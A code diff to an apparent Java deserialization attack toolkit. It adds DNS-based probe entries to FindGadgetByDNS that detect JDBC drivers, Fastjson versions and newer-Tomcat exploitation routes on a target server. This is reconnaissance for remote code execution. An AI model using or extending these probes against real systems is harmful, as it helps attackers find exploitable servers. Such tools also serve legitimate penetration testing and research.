@@ -96,6 +96,18 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
             {"cdbcp2", Fuzz.Fuzzmap.get("commons_dbcp2_RCE")},
             // jakarta 组（Tomcat 10 / Spring Boot 3）
             {"jel", "jakarta.el.ELProcessor"},
+            // P2: JDBC 新链探测
+            {"postgresql", Fuzz.Fuzzmap.get("postgresql")},
+            {"mysql8", Fuzz.Fuzzmap.get("mysql8")},
+            {"mysql5", Fuzz.Fuzzmap.get("mysql5")},
+            {"hikaricp", Fuzz.Fuzzmap.get("hikaricp")},
+            // P2: Fastjson 探测
+            {"fastjson1", Fuzz.Fuzzmap.get("fastjson1")},
+            {"fastjson2", Fuzz.Fuzzmap.get("fastjson2")},
+            // P2: 高版本 Tomcat 替代利用探测
+            {"memUserDb", Fuzz.Fuzzmap.get("memoryUserDb")},
+            {"velocity", Fuzz.Fuzzmap.get("velocity")},
+            {"jshell", Fuzz.Fuzzmap.get("jshell")},
             // JDK 版本组：java.* 标记在生成时由工具机本地解析，
             // 工具机 JDK 没有该类时自动跳过（见 getObject 容错）
             {"jdk8", "java.time.LocalDate"},
